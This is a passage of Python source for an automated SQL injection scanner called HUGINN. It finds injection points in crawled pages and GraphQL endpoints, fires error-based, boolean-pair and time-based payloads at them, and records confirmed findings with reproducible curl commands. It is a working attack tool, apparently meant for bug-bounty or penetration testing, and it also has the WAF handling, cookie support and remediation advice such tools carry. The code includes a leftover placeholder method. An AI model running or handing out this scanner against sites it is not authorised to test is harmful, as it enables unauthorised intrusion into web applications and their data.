                rb = build_request(ip, ctrl_b, timeout=self.timeout,
                                   extra_headers=self.static_headers)
                self._bump_counter()
            except Exception:
                rb = None

            if ra is not None and rb is not None:
                fa = _fingerprint_response(ra)
                fb = _fingerprint_response(rb)
                # Same response to two different random values ≠ baseline
                # → deterministic header-driven variation → body_diff unreliable
                if (fa["hash"] is not None and fa["hash"] == fb["hash"]
                        and _fingerprints_differ(fa, ip.baseline_fp,
                                                 min_len_delta=200)):
                    ip.deterministic_variation = True
                    log(f"  control-plane variation detected: "
                        f"{ip.url} [{ip.name}] (body_diff suppressed)",
                        "info", "SQLI")

        # --- Stability check with benign control ----------------------
        control = "hgnnctrl" + _rand_token(6)
        try:
            ctrl = build_request(ip, control, timeout=self.timeout,
                                 extra_headers=self.static_headers)
            self._bump_counter()
        except Exception:
            ctrl = None

        if ctrl is not None and ip.baseline_fp:
            ctrl_fp = _fingerprint_response(ctrl)
            if _fingerprints_differ(ctrl_fp, ip.baseline_fp, min_len_delta=200):
                self._throttle(ip.url)
                try:
                    ctrl2 = build_request(ip, control, timeout=self.timeout,
                                          extra_headers=self.static_headers)
                    self._bump_counter()
                except Exception:
                    ctrl2 = None
                if ctrl2 is not None:
                    ctrl2_fp = _fingerprint_response(ctrl2)
                    # Two different random controls differ from each other
                    # → unstable baseline
                    if _fingerprints_differ(ctrl_fp, ctrl2_fp, min_len_delta=200):
                        log(f"  skip (unstable baseline): "
                            f"{ip.url} [{ip.name}]", "info", "SQLI")
                        ip.skipped_reason = "unstable"
                        return False, {"unstable": True}

        # --- Quote canaries -------------------------------------------
        for canary in ("'", '"'):
            self._throttle(ip.url)
            try:
                r = build_request(ip, canary, timeout=self.timeout,
                                  extra_headers=self.static_headers)
                self._bump_counter()
            except Exception:
                continue
            if r is None:
                continue

            waf_tag = _detect_waf_challenge(r)
            if waf_tag and not ip.waf_tag:
                log(f"  WAF response during canary ({waf_tag}) "
                    f"on {ip.url} [{ip.name}]", "info", "SQLI")
                if self.abort_on_waf:
                    ip.skipped_reason = f"waf:{waf_tag}"
                    self._host_waf[urlparse(ip.url).netloc] = waf_tag
                    return False, {"waf": waf_tag}

            body = r.text or ""

            dbms, evidence = _match_error_signature(body, baseline_body)
            if dbms:
                hints["error"] = True
                hints["dbms"] = dbms
                hints["evidence"] = evidence
                return True, hints

            if (ip.baseline_resp.status_code < 500 and r.status_code >= 500
                    and GENERIC_500_HINTS.search(body)):
                hints["status"] = True
                return True, hints

            fp = _fingerprint_response(r)
            if _fingerprints_differ(fp, ip.baseline_fp, min_len_delta=200):
                # For control-plane headers, require SQL-ish body content
                if ip.is_control_plane and not SQLISH_BODY_HINT.search(body):
                    continue
                hints["body"] = True
                # do NOT return — keep looking for stronger signals
                # (we still fall through to boolean canary and then deep-test)

        # --- Boolean pair canary --------------------------------------
        tp = "' AND '1'='1"
        fp_ = "' AND '1'='2"
        try:
            self._throttle(ip.url)
            tr = build_request(ip, tp, timeout=self.timeout,
                               extra_headers=self.static_headers)
            self._bump_counter()
            time.sleep(0.15)
            self._throttle(ip.url)
            fr = build_request(ip, fp_, timeout=self.timeout,
                               extra_headers=self.static_headers)
            self._bump_counter()
            if tr is not None and fr is not None:
                tfp = _fingerprint_response(tr)
                ffp = _fingerprint_response(fr)
                if _fingerprints_differ(tfp, ffp, min_len_delta=80):
                    hints["boolean"] = True
                    return True, hints
        except Exception:
            pass

        if hints.get("body") or hints.get("status"):
            return True, hints
        return False, hints

    # ================================================================== #
    #  CONFIRMATION HELPERS
    # ================================================================== #
    def _confirm_error_based(self, ip, payload, first_dbms):
        baseline_body = (ip.baseline_resp.text or "") if ip.baseline_resp else ""

        self._throttle(ip.url)
        try:
            r = build_request(ip, payload, timeout=self.timeout,
                              extra_headers=self.static_headers)
            self._bump_counter()
        except Exception:
            return False
        if r is None:
            return False
        dbms2, _ = _match_error_signature(r.text or "", baseline_body)
        if dbms2 != first_dbms:
            return False

        control = re.sub(r"[^A-Za-z0-9]", "z", payload)
        if control == payload or not control:
            return True

        self._throttle(ip.url)
        try:
            cr = build_request(ip, control, timeout=self.timeout,
                               extra_headers=self.static_headers)
            self._bump_counter()
        except Exception:
            return True
        if cr is None:
            return True
        cdbms, _ = _match_error_signature(cr.text or "", baseline_body)
        if cdbms:
            log(f"  reject (control also errors): {ip.url} [{ip.name}]",
                "info", "SQLI")
            return False
        return True

    def _confirm_status_escalation(self, ip, payload):
        if ip.baseline_resp is None:
            return False

        self._throttle(ip.url)
        try:
            r = build_request(ip, payload, timeout=self.timeout,
                              extra_headers=self.static_headers)
            self._bump_counter()
        except Exception:
            return False
        if r is None or r.status_code < 500:
            return False

        control = re.sub(r"[^A-Za-z0-9]", "z", payload)
        if control == payload or not control:
            return True

        self._throttle(ip.url)
        try:
            cr = build_request(ip, control, timeout=self.timeout,
                               extra_headers=self.static_headers)
            self._bump_counter()
        except Exception:
            return True
        if cr is None:
            return True
        if cr.status_code >= 500:
            return False
        return True

    def _test_boolean_pair_confirmed(self, ip, true_p, false_p):
        try:
            self._throttle(ip.url)
            tr = build_request(ip, true_p, timeout=self.timeout,
                               extra_headers=self.static_headers)
            self._bump_counter()
            time.sleep(0.15)
            self._throttle(ip.url)
            fr = build_request(ip, false_p, timeout=self.timeout,
                               extra_headers=self.static_headers)
            self._bump_counter()
        except Exception:
            return None
        if tr is None or fr is None:
            return None

        tfp = _fingerprint_response(tr)
        ffp = _fingerprint_response(fr)
        if not _fingerprints_differ(tfp, ffp, min_len_delta=80):
            return None

        base_fp = ip.baseline_fp or {"hash": None, "length": 0, "status": None}
        if not (_fingerprints_differ(tfp, base_fp, min_len_delta=80)
                or _fingerprints_differ(ffp, base_fp, min_len_delta=80)):
            return None

        self._throttle(ip.url)
        time.sleep(0.3)
        try:
            self._throttle(ip.url)
            tr2 = build_request(ip, true_p, timeout=self.timeout,
                                extra_headers=self.static_headers)
            self._bump_counter()
            time.sleep(0.15)
            self._throttle(ip.url)
            fr2 = build_request(ip, false_p, timeout=self.timeout,
                                extra_headers=self.static_headers)
            self._bump_counter()
        except Exception:
            return None
        if tr2 is None or fr2 is None:
            return None

        tfp2 = _fingerprint_response(tr2)
        ffp2 = _fingerprint_response(fr2)
        if not _fingerprints_differ(tfp2, ffp2, min_len_delta=80):
            return None

        return {
            "subtype": "boolean_blind",
            "confidence": "high",
            "reason": "Boolean-based blind — TRUE/FALSE differential reproduced twice",
            "dbms": self.dbms_hint,
            "evidence": (f"true_len={tfp['length']} false_len={ffp['length']} "
                         f"base_len={base_fp.get('length', 0)}"),
            "verification_method": "boolean_pair",
        }

    def _test_timing_confirmed(self, ip, payload, first_elapsed):
        if ip.timing_baseline is None:
            return None

        threshold = max(
            self.time_threshold,
            ip.timing_baseline + 3.0 * (ip.timing_stddev or 0.2) + 2.0,
        )
        first_delta = first_elapsed - ip.timing_baseline
        if first_delta < threshold - 2.0:
            return None

        if not self.confirm_timing:
            if first_delta >= threshold:
                return {
                    "confidence": "medium",
                    "subtype": "time_based",
                    "reason": f"Time delay {first_elapsed:.2f}s "
                              f"(baseline {ip.timing_baseline:.2f}s)",
                    "dbms": self.dbms_hint,
                    "evidence": f"delay=+{first_delta:.2f}s",
                    "verification_method": "timing_unconfirmed",
                }
            return None

        reproductions = 0
        for _ in range(2):
            self._throttle(ip.url)
            t0 = time.time()
            try:
                build_request(ip, payload, timeout=self.timeout + 4,
                              extra_headers=self.static_headers)
                self._bump_counter()
            except Exception:
                continue
            elapsed = time.time() - t0
            if (elapsed - ip.timing_baseline) >= threshold - 2.0:
                reproductions += 1
            time.sleep(0.3)

        if reproductions < 2:
            return None

        return {
            "confidence": "high",
            "subtype": "time_based",
            "reason": (f"Time-based SQLi confirmed — "
                       f"{first_elapsed:.2f}s initial "
                       f"({reproductions}/2 reproductions)"),
            "dbms": self.dbms_hint,
            "evidence": (f"baseline={ip.timing_baseline:.2f}s "
                         f"first={first_elapsed:.2f}s "
                         f"reproductions={reproductions}/2"),
            "verification_method": "timing_confirmed",
        }

    # ================================================================== #
    #  BODY DIFF: statistical gate
    # ================================================================== #
    def _body_diff_significant(self, current_fp):
        """3σ test against statistical baseline; falls back to min 500B."""
        if ip_mean := getattr(self, "_unused", None):  # placeholder
            pass
        return None  # replaced below

    def _is_body_diff_significant(self, ip, current_fp):
        if current_fp is None or current_fp["hash"] is None:
            return False, 0
        if ip.baseline_fp is None or ip.baseline_fp["hash"] is None:
            return False, 0
        if current_fp["hash"] == ip.baseline_fp["hash"]:
            return False, 0
        delta = current_fp["length"] - (ip.baseline_len_mean
                                        if ip.baseline_len_mean is not None
                                        else ip.baseline_fp["length"])
        abs_delta = abs(delta)
        sigma = ip.baseline_len_stddev or 0.0
        required = max(500.0, 3.0 * sigma)
        return abs_delta >= required, abs_delta

    # ================================================================== #
    #  PAYLOAD ATTEMPT
    # ================================================================== #
    def _attempt_payload(self, ip, payload_obj, baseline_body):
        payload = payload_obj["payload"]
        is_time = bool(TIME_PAYLOADS.search(payload))

        self._throttle(ip.url)
        start = time.time()
        try:
            resp = build_request(ip, payload, timeout=self.timeout + 4,
                                 extra_headers=self.static_headers)
            self._bump_counter()
            self._note_throttle_signal(ip.url, resp)
        except Exception:
            return None
        elapsed = time.time() - start
        if resp is None:
            return None

        waf_tag = _detect_waf_challenge(resp)
        if waf_tag:
            if self.abort_on_waf:
                ip.skipped_reason = f"waf:{waf_tag}"
                self._host_waf[urlparse(ip.url).netloc] = waf_tag
            return None

        # --- Strategy 1: error-based ---------------------------------
        dbms, evidence = _match_error_signature(resp.text or "", baseline_body)
        if dbms:
            if self._confirm_error_based(ip, payload, dbms):
                return {
                    "subtype": "error_based",
                    "confidence": "high",
                    "reason": f"DBMS error signature matched ({dbms})",
                    "dbms": dbms,
                    "evidence": evidence,
                    "verification_method": "error_signature",
                    "_resp": resp, "_elapsed": elapsed,
                }

        # --- Strategy 2: status escalation ---------------------------
        if (ip.baseline_resp and ip.baseline_resp.status_code < 500
                and resp.status_code >= 500):
            if GENERIC_500_HINTS.search(resp.text or ""):
                if self._confirm_status_escalation(ip, payload):
                    return {
                        "subtype": "status_escalation",
                        "confidence": "medium",
                        "reason": (f"Status escalated "
                                   f"{ip.baseline_resp.status_code} → "
                                   f"{resp.status_code} with SQL-ish body"),
                        "dbms": None,
                        "evidence": (resp.text or "")[:400],
                        "verification_method": "status_escalation",
                        "_resp": resp, "_elapsed": elapsed,
                    }

        # --- Strategy 3: boolean pair --------------------------------
        if ("'1'='1" in payload) or re.search(r"\b1\s*=\s*1\b", payload):
            false_variant = _make_false_variant(payload)
            if false_variant and false_variant != payload:
                hit = self._test_boolean_pair_confirmed(ip, payload, false_variant)
                if hit:
                    hit["_resp"] = resp
                    hit["_elapsed"] = elapsed
                    return hit

        # --- Strategy 4: time-based ----------------------------------
        if is_time:
            hit = self._test_timing_confirmed(ip, payload, elapsed)
            if hit:
                hit["_resp"] = resp
                hit["_elapsed"] = elapsed
                return hit

        # --- Strategy 5: body diff (weak; heavily gated) -------------
        if is_time or resp.status_code >= 500:
            return None
        if ip.deterministic_variation:
            return None
        current = _fingerprint_response(resp)
        significant, abs_delta = self._is_body_diff_significant(ip, current)
        if not significant:
            return None

        # Control-plane headers: also require SQL-ish body indicator
        if ip.is_control_plane:
            if not SQLISH_BODY_HINT.search(resp.text or ""):
                return None

        return {
            "subtype": "body_diff",
            "confidence": "low",
            "reason": f"Response body shifted by {abs_delta:.0f} bytes (σ-gated)",
            "dbms": None,
            "evidence": (
                f"baseline_len={ip.baseline_fp['length']} "
                f"mean={ip.baseline_len_mean:.0f} "
                f"sigma={ip.baseline_len_stddev:.0f} "
                f"current_len={current['length']} "
                f"delta={abs_delta:.0f}"
            ),
            "verification_method": "body_diff",
            "_resp": resp, "_elapsed": elapsed,
        }

    # ================================================================== #
    #  FINDING PERSISTENCE
    # ================================================================== #
    def _save_finding(self, ip, payload_obj, hit):
        resp = hit.get("_resp")
        elapsed = hit.get("_elapsed", 0.0)
        payload = payload_obj["payload"]

        confidence = hit["confidence"]
        severity = _severity_for(confidence)

        is_confirmed = hit.get("verification_method") in (
            "error_signature", "timing_confirmed", "boolean_pair",
        )

        # Persist confirmed only unless user explicitly wants unconfirmed
        if not is_confirmed and not self.save_unconfirmed:
            log(f"  (candidate, not persisted) {hit['subtype']} on "
                f"{ip.location}:{ip.name} @ {ip.url}", "info", "SQLI")
            return None

        baseline = ip.baseline_snapshot or {}

        finding = {
            "type": "sqli",
            "subtype": hit["subtype"],
            "severity": severity,
            "confidence": confidence,
            "confirmed": is_confirmed,
            "verification_method": hit.get("verification_method"),

            "url": ip.url,
            "method": ip.method,
            "parameter": ip.name,
            "injection_point": {
                "location": ip.location,
                "name": ip.name,
                "original_value": (ip.value or "")[:200],
                "json_path": ip.json_path,
                "is_control_plane": ip.is_control_plane,
            },

            "payload_id":          payload_obj.get("id"),
            "payload_name":        payload_obj.get("name"),
            "payload":             payload,
            "payload_category":    payload_obj.get("category"),
            "payload_dbms":        payload_obj.get("dbms"),
            "payload_tags":        payload_obj.get("tags", []),
            "payload_description": payload_obj.get("description", ""),

            "matched_dbms":      hit.get("dbms"),
            "detection_reason":  hit["reason"],
            "evidence":          hit.get("evidence", ""),

            "response_status":   resp.status_code if resp else None,
            "response_length":   len(resp.text or "") if resp else None,
            "response_snippet":  (resp.text or "")[:800],

            "baseline_status":   baseline.get("status"),
            "baseline_length":   baseline.get("length"),
            "baseline_hash":     baseline.get("hash"),
            "baseline_mean":     (round(ip.baseline_len_mean, 1)
                                  if ip.baseline_len_mean is not None else None),
            "baseline_sigma":    (round(ip.baseline_len_stddev, 1)
                                  if ip.baseline_len_stddev is not None else None),
            "baseline_timing":   round(ip.timing_baseline or 0, 3),
            "timing_stddev":     round(ip.timing_stddev or 0, 3),
            "elapsed_seconds":   round(elapsed, 3),

            "control_plane_header": ip.is_control_plane,
            "deterministic_variation": ip.deterministic_variation,
            "spa_route": ip.spa_route,

            "curl_command": build_curl(ip, payload,
                                       static_headers=self.static_headers),

            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "remediation": (
                "Use parameterized queries / prepared statements. Never "
                "concatenate user input into SQL. Apply least-privilege DB "
                "accounts. Validate and whitelist input server-side. "
                "Suppress DBMS error messages in production responses. "
                "Enable detailed SQL error logging server-side instead."
            ),
        }

        with self._save_lock:
            sig = hashlib.md5(
                f"{ip.url}|{ip.name}|{payload_obj.get('id')}|{confidence}".encode()
            ).hexdigest()
            if sig in self.seen_signatures:
                return None
            self.seen_signatures.add(sig)

        host = urlparse(ip.url).netloc
        slug = safe_filename(
            (urlparse(ip.url).path or "/").replace("/", "_") + "__" + ip.name
        )
        fname = f"{slug}__{payload_obj.get('id','x')}_sqli_vulnerable.json"
        out_path = self.findings_root / safe_filename(host) / fname
        save_json(out_path, finding)

        sev_color = {
            "high":   "\033[38;5;196m",
            "medium": "\033[38;5;226m",
            "low":    "\033[38;5;240m",
        }.get(severity, "\033[0m")

        log(
            f"[{sev_color}{severity.upper():6}\033[0m] "
            f"{ip.location}:{ip.name} @ {ip.url} "
            f"({payload_obj.get('name')} → {hit['verification_method']})",
            "hit", "SQLI",
        )
        return finding

    # ================================================================== #
    #  TEST ONE POINT
    # ================================================================== #
    def test_point(self, ip, payloads):
        if self._shutdown_requested():
            return []

        self.capture_baseline(ip)

        if ip.skipped_reason:
            return []

        interesting, hints = self._triage_point(ip)
        if not interesting:
            return []

        baseline_body = (ip.baseline_resp.text or "") if ip.baseline_resp else ""

        strong_hits = []
        bodydiff_hits = []
        seen_payloads = set()
        requests_used = 0

        for p in payloads:
            if self._shutdown_requested():
                break
            if requests_used >= self.point_budget:
                log(f"  per-point budget hit on {ip}", "info", "SQLI")
                break
            if ip.skipped_reason and ip.skipped_reason.startswith("waf:"):
                break

            payload = p.get("payload")
            if not payload or payload in seen_payloads:
                continue
            seen_payloads.add(payload)

            try:
                hit = self._attempt_payload(ip, p, baseline_body)
                requests_used += 1
            except Exception as e:
                log(f"  payload error on {ip}: {e}", "warn", "SQLI")
                hit = None

            if hit:
                if hit["subtype"] == "body_diff":
                    bodydiff_hits.append((hit, p))
                else:
                    strong_hits.append((hit, p))
            time.sleep(self.delay)

        saved = []
        for hit, p in strong_hits:
            f = self._save_finding(ip, p, hit)
            if f:
                saved.append(f)

        # Body-diff needs ≥3 DISTINCT payload IDs, each σ-significant
        if bodydiff_hits and not ip.deterministic_variation:
            distinct_ids = {p.get("id") for _, p in bodydiff_hits}
            if len(distinct_ids) >= 3:
                for hit, p in bodydiff_hits[:3]:
                    f = self._save_finding(ip, p, hit)
                    if f:
                        saved.append(f)

        return saved

    # ================================================================== #
    #  MAIN
    # ================================================================== #
    def run(self):
        section("SQLi SCANNER :: INITIALISING")

        payloads = self.load_and_filter_payloads()
        log(f"loaded {len(payloads)} unique payloads "
            f"(waf={self.waf_hint or 'none'}, dbms={self.dbms_hint or 'none'})",
            "info")

        pages = []
        for jf in self.sites_root.rglob("*.json"):
            if jf.name.startswith("_"):
                continue
            try:
                rec = load_json(jf)
                if rec.get("url") and not _is_static_url(rec["url"]):
                    pages.append(rec)
            except Exception:
                continue

        log(f"loaded {len(pages)} testable pages", "info")

        points, discovered_urls = extract_injection_points(pages)
        log(f"extracted {len(points)} injection points "
            f"({len(discovered_urls)} JS-discovered URLs)", "ok")

        # ---- GraphQL detection --------------------------------------
        gql_candidates = _graphql_probe_urls(pages, discovered_urls)
        gql_points = []
        for gu in gql_candidates[:25]:
            if _is_static_url(gu) or self._shutdown_requested():
                continue
            if _is_graphql_endpoint(gu, self.static_headers, self.timeout):
                log(f"graphql endpoint detected: {gu}", "ok", "SQLI")
                gql_points.extend(_graphql_injection_points(gu))
                break

        if gql_points:
            log(f"added {len(gql_points)} GraphQL injection points", "ok")
            existing = {ip.key() for ip in points}
            for ip in gql_points:
                if ip.key() not in existing:
                    points.append(ip)
                    existing.add(ip.key())

        if not points:
            log("nothing to test", "warn")
            return []

        section("SQLi SCANNER :: TRIAGE + STRIKE PHASE")
        all_findings = []
        done = 0
        total = len(points)

        def _interrupt(sig, frame):
            log("interrupt received — draining workers...", "warn", "SQLI")
            self.request_shutdown()

        old_handler = signal.getsignal(signal.SIGINT)
        try:
            signal.signal(signal.SIGINT, _interrupt)
        except Exception:
            old_handler = None

        try:
            with ThreadPoolExecutor(max_workers=self.max_workers) as pool:
                futures = {pool.submit(self.test_point, ip, payloads): ip
                           for ip in points}
                for fut in as_completed(futures):
                    done += 1
                    ip = futures[fut]
                    try:
                        all_findings.extend(fut.result())
                    except Exception as e:
                        log(f"error testing {ip}: {e}", "warn")
                    if done % 10 == 0 or done == total:
                        log(f"progress {done}/{total}  "
                            f"candidates={len(all_findings)}  "
                            f"requests={self._request_count}",
                            "info")
        finally:
            if old_handler is not None:
                try:
                    signal.signal(signal.SIGINT, old_handler)
                except Exception:
                    pass

        # ---- Summary --------------------------------------------------
        section("SQLi SCANNER :: COMPLETE")
        confirmed = [f for f in all_findings if f.get("confirmed")]
        if all_findings:
            by_conf, by_method = {}, {}
            for f in all_findings:
                by_conf[f["confidence"]] = by_conf.get(f["confidence"], 0) + 1
                m = f.get("verification_method", "unknown")
                by_method[m] = by_method.get(m, 0) + 1
            for c in ("high", "medium", "low"):
                if c in by_conf:
                    log(f"{c:8} : {by_conf[c]}", "ok")
            log(f"methods  : {by_method}", "info")
            log(f"total candidates : {len(all_findings)}", "ok")
            log(f"confirmed only   : {len(confirmed)}", "ok", "DONE")
        else:
            log("no SQLi findings", "info", "DONE")

        save_json(self.findings_root / "_summary.json", {
            "total": len(all_findings),
            "confirmed": len(confirmed),
            "by_confidence": {
                c: sum(1 for f in all_findings if f["confidence"] == c)
                for c in ("high", "medium", "low")
            },
            "by_method": {
                m: sum(1 for f in all_findings
                        if f.get("verification_method") == m)
                for m in set(f.get("verification_method") for f in all_findings)
            },
            "requests_sent": self._request_count,
            "hosts_waf_flagged": dict(self._host_waf),
            "waf_hint": self.waf_hint,
            "dbms_hint": self.dbms_hint,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "findings": [
                {"url": f["url"], "param": f["parameter"],
                 "confidence": f["confidence"],
                 "confirmed": f.get("confirmed"),
                 "method": f.get("verification_method"),
                 "payload_name": f["payload_name"]}
                for f in all_findings
            ],
        })

        return all_findings


# =============================================================================
#  ENTRY
# =============================================================================
def run(program_dir, sites_root=None, waf_hint=None, dbms_hint=None,
        cookie=None, user_agent=None, confirm_timing=True,
        save_unconfirmed=False):
    scanner = SQLiScanner(
        program_dir=program_dir,
        sites_root=sites_root,
        waf_hint=waf_hint,
        dbms_hint=dbms_hint,
        cookie=cookie,
        user_agent=user_agent,
        confirm_timing=confirm_timing,
        save_unconfirmed=save_unconfirmed,
    )
    return scanner.run()


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="HUGINN SQLi scanner v3.2")
    ap.add_argument("program_dir")
    ap.add_argument("--waf", default=None,
                    help="WAF hint (cloudflare, akamai, ...)")
    ap.add_argument("--dbms", default=None,
                    help="DBMS hint (mysql, postgresql, mssql, oracle, ...)")
    ap.add_argument("--cookie", default=None,
                    help="Cookie header value for authenticated scanning")
    ap.add_argument("--user-agent", default=None,
                    help="User-Agent header override")
    ap.add_argument("--no-confirm-timing", action="store_true",
                    help="skip 3-attempt timing confirmation")
    ap.add_argument("--time-threshold", type=float, default=4.0,
                    help="minimum timing delta in seconds (default: 4.0)")
    ap.add_argument("--save-unconfirmed", action="store_true",
                    help="persist low-confidence body_diff/timing candidates "
                         "(default: only confirmed findings are saved)")
    ap.add_argument("--workers", type=int, default=4,
                    help="concurrent workers (default: 4)")
    ap.add_argument("--delay", type=float, default=0.25,
                    help="minimum per-host delay between requests")
    args = ap.parse_args()

    run(args.program_dir,
        waf_hint=args.waf,
        dbms_hint=args.dbms,
        cookie=args.cookie,
        user_agent=args.user_agent,
        confirm_timing=not args.no_confirm_timing,
        save_unconfirmed=args.save_unconfirmed)
